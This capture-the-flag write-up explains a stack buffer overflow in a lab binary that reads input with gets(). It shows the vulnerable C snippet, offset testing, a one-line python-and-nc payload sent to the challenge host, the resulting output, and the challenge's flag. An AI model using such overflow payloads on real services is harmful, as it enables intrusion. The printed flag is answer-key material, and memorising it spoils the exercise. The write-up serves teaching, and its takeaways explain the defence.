# Local Target

## Description
Smash the stack! Overflow the buffer and modify another local variable to obtain the flag.

## Source Code Analysis
The vulnerable code contains:

```c
char input[16];
int num = 64;

gets(input);

if (num == 65) {
    // Print flag
}
```

The `gets()` function does not perform bounds checking, allowing input to overflow the buffer and overwrite adjacent stack memory.

## Exploitation

### Step 1: Identify the target variable
The initial value of `num` is 64 (`0x40`).

The win condition requires:

```c
num == 65
```

65 in hexadecimal is `0x41`, corresponding to ASCII `A`.

### Step 2: Determine the offset
Testing different payload lengths revealed:

| Payload | Result |
|---|---|
| 20 A's | `num is 64` |
| 24 A's | `num is 0` |
| 28 A's | `num is 1094795585` |

The value `1094795585` equals `0x41414141`, confirming that the integer was overwritten with four `A` bytes.

The offset to `num` is 24 bytes.

### Step 3: Craft the payload

```bash
python3 -c 'print("A"*25)' | nc chatelaine.cylabacademy.net 28463
```

The payload overwrites the first byte of `num` with `0x41`, changing its value from 64 to 65.

### Step 4: Retrieve the flag

Output:

```text
Enter a string:
num is 65
You win!
academy{l0c4l5_1n_5c0p3_2b82c978}
```

## Flag

```text
academy{l0c4l5_1n_5c0p3_2b82c978}
```

## Key Takeaways
- `gets()` is unsafe because it does not enforce buffer boundaries.
- Stack-based buffer overflows can overwrite adjacent local variables.
- Little-endian representation determines which byte needs modification.
- ASCII `A` is hexadecimal `0x41`, decimal 65.
- Proper bounds checking and safer input functions prevent this vulnerability.